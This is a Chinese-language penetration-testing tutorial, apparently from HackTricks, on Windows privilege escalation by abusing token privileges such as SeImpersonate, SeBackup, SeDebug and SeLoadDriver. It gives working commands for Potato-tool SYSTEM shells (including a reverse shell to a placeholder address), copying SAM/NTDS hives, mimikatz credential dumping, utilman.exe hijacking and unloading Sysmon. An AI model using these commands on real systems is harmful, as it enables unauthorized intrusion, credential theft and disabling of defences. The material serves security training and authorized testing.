# 滥用 Tokens

{{#include ../../banners/hacktricks-training.md}}

## Tokens

如果你**不知道什么是 Windows Access Tokens**，请在继续之前阅读此页面：


{{#ref}}
access-tokens.md
{{#endref}}

**你可能可以通过滥用已经持有的 tokens 来提升权限。**

### SeImpersonatePrivilege

此权限允许进程在能够获取某个 token 的句柄时模拟该 token（但不能创建 token）。通过诱使 Windows service（DCOM）对 exploit 执行 NTLM authentication，可以从中获取 privileged token，随后启用一个以 SYSTEM privileges 执行的进程。<sup>[[2]](#references)</sup>可以使用 [JuicyPotato](https://github.com/ohpe/juicy-potato)、[RogueWinRM](https://github.com/antonioCoco/RogueWinRM)（要求禁用 WinRM）、[SweetPotato](https://github.com/CCob/SweetPotato) 和 [PrintSpoofer](https://github.com/itm4n/PrintSpoofer) 等工具利用这一原语。

现代 operator 注意事项：

- **JuicyPotato 已过时**：在 Windows 10 1809+/Server 2019+ 上，根据仍可访问的 RPC/COM surface，优先使用 **GodPotato**、**SigmaPotato**、**PrintNotifyPotato**、**RoguePotato**、**SharpEfsPotato/EfsPotato** 或 **PrintSpoofer**。
- 如果你攻陷了一个以 **`LOCAL SERVICE`** 或 **`NETWORK SERVICE`** 身份运行的 service，并且 `whoami /priv` 显示的是没有 `SeImpersonatePrivilege`/`SeAssignPrimaryTokenPrivilege` 的 **filtered token**，请先恢复该账户的**默认 privilege set**（例如使用 **FullPowers**），然后再尝试 potato family。<sup>[[3]](#references)</sup>
- 一些较新的 forks 比原始工具更便于 operator 使用。例如，**SigmaPotato** 增加了 reflection/in-memory execution 和对现代 Windows 的兼容性，而 **PrintNotifyPotato** 则滥用 PrintNotify COM service；当经典 Spooler path 被禁用时，它通常很有用。
```cmd
FullPowers.exe -c "cmd /c whoami /priv" -z
GodPotato.exe -cmd "cmd /c whoami"
SigmaPotato.exe --revshell <ip> <port>
PrintNotifyPotato.exe whoami
```
{{#ref}}
roguepotato-and-printspoofer.md
{{#endref}}


{{#ref}}
juicypotato.md
{{#endref}}

### SeAssignPrimaryPrivilege

它与 **SeImpersonatePrivilege** 非常相似，会使用**相同的方法**获取特权 token。\
随后，此权限允许将**主 token 分配**给新的/挂起的进程。借助特权 impersonation token，可以派生出一个主 token（DuplicateTokenEx）。\
使用该 token，可以通过 'CreateProcessAsUser' **创建新进程**，或者创建一个挂起的进程并**设置 token**（通常无法修改正在运行进程的主 token）。<sup>[[2]](#references)</sup>

### SeTcbPrivilege

如果启用了此 token，就可以使用 **KERB_S4U_LOGON** 为任意其他用户获取 **impersonation token**，而无需知道其凭据；向 token 中**添加任意组**（admins）；将 token 的**完整性级别**设置为“**medium**”；并将此 token 分配给**当前线程**（SetThreadToken）。<sup>[[2]](#references)</sup>

### SeBackupPrivilege

此权限会使系统向任意文件**授予所有读取访问权限**（仅限读取操作）。它可用于从注册表中**读取本地 Administrator** 账户的密码哈希，之后可以使用 "**psexec**" 或 "**wmiexec**" 等工具配合该哈希进行操作（Pass-the-Hash technique）。但是，在以下两种情况下，此技术会失效：Local Administrator 账户已被禁用，或者存在一项策略，移除了远程连接的 Local Administrators 的管理权限。<sup>[[2]](#references)</sup>\
实际上，最可靠的内置工作流通常是 **VSS + `robocopy /b`**：创建/公开一个 shadow copy，然后以**备份模式**复制 `SAM`/`SYSTEM` 或 `NTDS.dit`，从而绕过文件 ACL。<sup>[[4]](#references)</sup>
```cmd
:: shadow.txt
set context persistent nowriters
add volume c: alias tk
create
expose %tk% z:

:: then copy sensitive files from the snapshot
diskshadow /s shadow.txt
robocopy /b z:\Windows\System32\Config C:\temp SAM SYSTEM SECURITY
robocopy /b z:\Windows\NTDS C:\temp ntds.dit
```
你可以通过以下方式 **abuse this privilege**：

- [https://github.com/Hackplayers/PsCabesha-tools/blob/master/Privesc/Acl-FullControl.ps1](https://github.com/Hackplayers/PsCabesha-tools/blob/master/Privesc/Acl-FullControl.ps1)
- [https://github.com/giuliano108/SeBackupPrivilege/tree/master/SeBackupPrivilegeCmdLets/bin/Debug](https://github.com/giuliano108/SeBackupPrivilege/tree/master/SeBackupPrivilegeCmdLets/bin/Debug)
- 按照 [https://www.youtube.com/watch?v=IfCysW0Od8w\&t=2610\&ab_channel=IppSec](https://www.youtube.com/watch?v=IfCysW0Od8w&t=2610&ab_channel=IppSec) 中 **IppSec** 的演示操作
- 或参考以下 **escalating privileges with Backup Operators** 部分的说明：


{{#ref}}
../active-directory-methodology/privileged-groups-and-token-privileges.md
{{#endref}}

### SeRestorePrivilege

此 privilege 提供对任意系统文件的 **write access**，不受文件 Access Control List（ACL）的限制。它为 privilege escalation 提供了多种可能性，包括能够 **modify services**、执行 DLL Hijacking，以及通过 Image File Execution Options 设置 **debuggers** 等技术。<sup>[[2]](#references)</sup>

### SeCreateTokenPrivilege

SeCreateTokenPrivilege 是一种强大的 permission，尤其适用于用户能够 impersonate tokens 的情况；即使没有 SeImpersonatePrivilege，它也同样有用。此能力取决于 impersonate 一个代表同一用户且 integrity level 不高于当前 process 的 token。<sup>[[2]](#references)</sup>

**要点：**

- **无需 SeImpersonatePrivilege 即可进行 impersonation：** 在特定条件下，可以利用 SeCreateTokenPrivilege 通过 impersonate tokens 实现 EoP。
- **Token impersonation 的条件：** 目标 token 必须属于同一用户，并且其 integrity level 小于或等于执行 impersonation 的 process 的 integrity level，才能成功进行 impersonation。
- **创建和修改 impersonation tokens：** 用户可以创建一个 impersonation token，并通过添加 privileged group 的 SID（Security Identifier）来提升其权限。

### SeLoadDriverPrivilege

此 privilege 允许 process 通过创建包含特定 `ImagePath` 和 `Type` 值的 registry entry 来 **load and unload device drivers**。由于对 `HKLM`（HKEY_LOCAL_MACHINE）的直接 write access 受到限制，因此可以改用 `HKCU`（HKEY_CURRENT_USER）。不过，需要使用特定 path，才能让 kernel 将 `HKCU` entry 识别为 driver configuration。<sup>[[2]](#references)</sup>

现代 offensive 使用通常是 **BYOVD**（bring your own vulnerable driver）：加载一个 **signed but vulnerable** 的 kernel driver，然后使用其 IOCTLs 禁用 protections，或跳转到 kernel code execution。请注意，在较新的 Windows 11/Server builds 上，**Microsoft vulnerable driver blocklist** 和/或 **HVCI/Memory Integrity** 经常会导致旧版 public chains 失效，因此经典的 `szkg64.sys` 风格示例不再始终可靠。

此 path 为 `\Registry\User\<RID>\System\CurrentControlSet\Services\DriverName`，其中 `<RID>` 是当前用户的 Relative Identifier。在 `HKCU` 中，必须创建完整 path，并设置以下两个 values：<sup>[[2]](#references)</sup>

- `ImagePath`，即要执行的 binary 的 path
- `Type`，值为 `SERVICE_KERNEL_DRIVER`（`0x00000001`）。

**操作步骤：**

1. 由于 write access 受到限制，使用 `HKCU` 而不是 `HKLM`。
2. 在 `HKCU` 中创建 path `\Registry\User\<RID>\System\CurrentControlSet\Services\DriverName`，其中 `<RID>` 表示当前用户的 Relative Identifier。
3. 将 `ImagePath` 设置为 binary 的 execution path。
4. 将 `Type` 设置为 `SERVICE_KERNEL_DRIVER`（`0x00000001`）。
```python
# Example Python code to set the registry values
import winreg as reg

# Define the path and values
path = r'Software\YourPath\System\CurrentControlSet\Services\DriverName' # Adjust 'YourPath' as needed
key = reg.OpenKey(reg.HKEY_CURRENT_USER, path, 0, reg.KEY_WRITE)
reg.SetValueEx(key, "ImagePath", 0, reg.REG_SZ, "path_to_binary")
reg.SetValueEx(key, "Type", 0, reg.REG_DWORD, 0x00000001)
reg.CloseKey(key)
```
在 [https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges#seloaddriverprivilege](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges#seloaddriverprivilege) 中介绍了更多滥用此权限的方法。

### SeTakeOwnershipPrivilege

这与 **SeRestorePrivilege** 类似。其主要功能允许进程**取得对象的所有权**，通过提供 WRITE_OWNER 访问权限，绕过显式 discretionary access 的要求。该过程首先获取目标 registry key 的所有权以进行写入，然后修改 DACL 以启用写操作。<sup>[[2]](#references)</sup>
```bash
takeown /f 'C:\some\file.txt' #Now the file is owned by you
icacls 'C:\some\file.txt' /grant <your_username>:F #Now you have full access
# Use this with files that might contain credentials such as
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software
%WINDIR%\repair\security
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
c:\inetpub\wwwwroot\web.config
```
### SeDebugPrivilege

此 privilege 允许 **debug other processes**，包括读取和写入其内存。借助此 privilege，可以采用多种 memory injection 策略，从而规避大多数 antivirus 和 host intrusion prevention solutions。<sup>[[2]](#references)</sup>

在现代 Windows 上，请记住，`SeDebugPrivilege` 通常足以打开**非受保护的 SYSTEM processes**并复制其 tokens，但这**并不保证**你能够接触 **LSASS**。如果启用了 **RunAsPPL / LSA Protection**，即使存在 `SeDebugPrivilege`，非受保护的 processes 也无法读取或注入 LSASS。在这种情况下，应从其他非 PPL 的 SYSTEM process 窃取 token，或与 PPL bypass/BYOVD 链接使用，而不要想当然地认为 `procdump` 一定有效。有关使用 `SeDebugPrivilege` + `SeImpersonatePrivilege` 完整复制 token 的示例，请查看[此页面](sedebug-+-seimpersonate-copy-token.md)。

#### Dump memory

你可以使用 [ProcDump](https://docs.microsoft.com/en-us/sysinternals/downloads/procdump)（来自 [SysInternals Suite](https://docs.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite)）来**捕获某个 process 的内存**。具体来说，这可以应用于 **Local Security Authority Subsystem Service (**[**LSASS**](https://en.wikipedia.org/wiki/Local_Security_Authority_Subsystem_Service)**)** process；该 process 负责在用户成功登录系统后存储用户 credentials。

然后可以将此 dump 加载到 mimikatz 中以获取 passwords：
```
mimikatz.exe
mimikatz # log
mimikatz # sekurlsa::minidump lsass.dmp
mimikatz # sekurlsa::logonpasswords
```
#### RCE

如果想要获取 `NT SYSTEM` shell，可以使用：

- [**SeDebugPrivilege-Exploit (C++)**](https://github.com/bruno-1337/SeDebugPrivilege-Exploit)
- [**SeDebugPrivilegePoC (C#)**](https://github.com/daem0nc0re/PrivFu/tree/main/PrivilegedOperations/SeDebugPrivilegePoC)
- [**psgetsys.ps1 (Powershell Script)**](https://raw.githubusercontent.com/decoder-it/psgetsystem/master/psgetsys.ps1)
```bash
# Get the PID of a process running as NT SYSTEM
import-module psgetsys.ps1; [MyProcess]::CreateProcessFromParent(<system_pid>,<command_to_execute>)
```
### SeManageVolumePrivilege

此权限（执行卷维护任务）允许打开原始卷设备句柄（例如，\\.\C:），执行绕过 NTFS ACLs 的直接磁盘 I/O。借助此权限，你可以通过读取底层磁盘块来复制卷中任意文件的字节，从而任意读取敏感材料（例如，%ProgramData%\Microsoft\Crypto\ 中的计算机私钥、注册表配置单元，以及通过 VSS 获取的 SAM/NTDS）。<sup>[[5]](#references)</sup> 它对 CA 服务器的影响尤其严重，因为窃取 CA 私钥后，可以伪造 Golden Certificate，冒充任意主体。<sup>[[6]](#references)</sup>

请参阅详细的技术和缓解措施：

{{#ref}}
semanagevolume-perform-volume-maintenance-tasks.md
{{#endref}}

## 检查权限
```
whoami /priv
```
**显示为 Disabled** 的 tokens 通常可以被启用，因此你通常可以同时滥用 _Enabled_ 和 _Disabled_ 权限。

### 启用所有 tokens

如果你拥有被禁用的权限，可以使用脚本 [**EnableAllTokenPrivs.ps1**](https://raw.githubusercontent.com/fashionproof/EnableAllTokenPrivs/master/EnableAllTokenPrivs.ps1) 来启用所有 tokens：
```bash
.\EnableAllTokenPrivs.ps1
whoami /priv
```
或者此 [**post**](https://www.leeholmes.com/adjusting-token-privileges-in-powershell/) 中嵌入的 **script**。

## Table

完整的 token privileges cheatsheet 位于 [https://github.com/gtworek/Priv2Admin](https://github.com/gtworek/Priv2Admin)，下面的摘要仅列出直接利用该 privilege 获取管理员 session 或读取敏感文件的方法。<sup>[[1]](#references)</sup>

| Privilege                  | Impact      | Tool                    | Execution path                                                                                                                                                                                                                                                                                                                                     | Remarks                                                                                                                                                                                                                                                                                                                        |
| -------------------------- | ----------- | ----------------------- | -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ |
| **`SeAssignPrimaryToken`** | _**管理员**_ | 第三方工具          | _"它允许用户 impersonate tokens，并使用 potato.exe、rottenpotato.exe 和 juicypotato.exe 等工具将权限提升到 nt system"_                                                                                                                                                                                                      | 感谢 [Aurélien Chalot](https://twitter.com/Defte_) 提供更新。我会尽快将其重新表述为更像 recipe 的形式。                                                                                                                                                                                         |
| **`SeBackup`**             | **威胁**  | _**内置命令**_ | 使用 `robocopy /b` 或专用的 SeBackup-aware copy helpers 读取敏感文件。                                                                                                                                                                                                                                                                 | <p>- 非常适合处理 `SAM`/`SYSTEM`、`SECURITY`、`NTDS.dit`，有时也适用于 `%WINDIR%\MEMORY.DMP`。<br><br>- `robocopy` 使用方便，但专用的 SeBackup cmdlets/APIs 通常更灵活，适合处理锁定或已打开的文件。</p>                                                                                                   |
| **`SeCreateToken`**        | _**管理员**_ | 第三方工具          | 使用 `NtCreateToken` 创建包含本地管理员权限的任意 token。                                                                                                                                                                                                                                                                          |                                                                                                                                                                                                                                                                                                                                |
| **`SeDebug`**              | _**管理员**_ | **PowerShell**          | Duplicate 一个 **non-PPL** SYSTEM token，或从 non-protected process 转储内存。                                                                                                                                                                                                                                                                 | <p>如果启用了 RunAsPPL/LSA Protection，LSASS dumping 通常会被阻止。</p><p>Script 位于 [FuzzySecurity](https://github.com/FuzzySecurity/PowerShell-Suite/blob/master/Conjure-LSASS.ps1)</p>                                                                                                               |
| **`SeImpersonate`**        | _**管理员**_ | 第三方工具          | 使用 **Potato family** / named-pipe impersonation 生成 SYSTEM（`PrintSpoofer`、`RoguePotato`、`GodPotato`、`SigmaPotato`、`PrintNotifyPotato` 等）。                                                                                                                                                                                    | <p>对于 IIS APPPOOL、MSSQL、scheduled tasks 等 service accounts，或任何已经拥有 `SeImpersonatePrivilege` 的 context，这通常是最实用的方法。</p>                                                                                                                                                                            |
| **`SeLoadDriver`**         | _**管理员**_ | 第三方工具          | <p>1. 加载已签名但存在漏洞的 kernel driver（BYOVD）<br>2. 使用该 driver 的 IOCTLs 获取 kernel R/W、禁用 security tooling，或提升至 SYSTEM<br><br>或者，也可以使用该 privilege 通过内置的 <code>fltMC</code> command 卸载 security-related drivers，例如 <code>fltMC sysmondrv</code></p>                     | <p>较旧的 public drivers，例如 <code>szkg64.sys</code>，在现代 Windows 上正越来越多地受到 vulnerable-driver blocklist / HVCI 的阻止。</p>                                                                                                                                                                               |
| **`SeRestore`**            | _**管理员**_ | **PowerShell**          | <p>1. 启动具有 SeRestore privilege 的 PowerShell/ISE。<br>2. 使用 <a href="https://github.com/gtworek/PSBits/blob/master/Misc/EnableSeRestorePrivilege.ps1">Enable-SeRestorePrivilege</a>) 启用该 privilege。<br>3. 将 utilman.exe 重命名为 utilman.old<br>4. 将 cmd.exe 重命名为 utilman.exe<br>5. 锁定 console 并按下 Win+U</p> | <p>某些 AV software 可能会检测到此攻击。</p><p>Alternative method 依赖于使用相同 privilege 替换存储在 "Program Files" 中的 service binaries</p>                                                                                                                                                            |
| **`SeTakeOwnership`**      | _**管理员**_ | _**内置命令**_ | <p>1. <code>takeown.exe /f "%windir%\system32"</code><br>2. <code>icacls.exe "%windir%\system32" /grant "%username%":F</code><br>3. 将 cmd.exe 重命名为 utilman.exe<br>4. 锁定 console 并按下 Win+U</p>                                                                                                                                       | <p>某些 AV software 可能会检测到此攻击。</p><p>Alternative method 依赖于使用相同 privilege 替换存储在 "Program Files" 中的 service binaries。</p>                                                                                                                                                           |
| **`SeTcb`**                | _**管理员**_ | 第三方工具          | <p>Manipulate tokens，使其包含本地管理员权限。可能需要 SeImpersonate。</p><p>有待验证。</p>                                                                                                                                                                                                                                     |                                                                                                                                                                                                                                                                                                                                |

## References

- [1] [gtworek/Priv2Admin - 从 Windows privileges 到管理员的 exploitation paths](https://github.com/gtworek/Priv2Admin)
- [2] [滥用 Token Privileges 进行 LPE](https://github.com/hatRiot/token-priv/blob/master/abusing_token_eop_1.0.txt)
- [3] [itm4n – 把我的 Privileges 还给我！可以吗？](https://itm4n.github.io/localservice-privileges/)
- [4] [Microsoft – 执行 Robocopy（`/b` backup mode 绕过 file/folder ACL checks）](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/robocopy)
- [5] [Microsoft – 执行 volume maintenance tasks（SeManageVolumePrivilege）](https://learn.microsoft.com/previous-versions/windows/it-pro/windows-10/security/threat-protection/security-policy-settings/perform-volume-maintenance-tasks)
- [6] [0xdf – HTB: Certificate（SeManageVolumePrivilege → CA key exfil → Golden Certificate）](https://0xdf.gitlab.io/2025/10/04/htb-certificate.html)
{{#include ../../banners/hacktricks-training.md}}
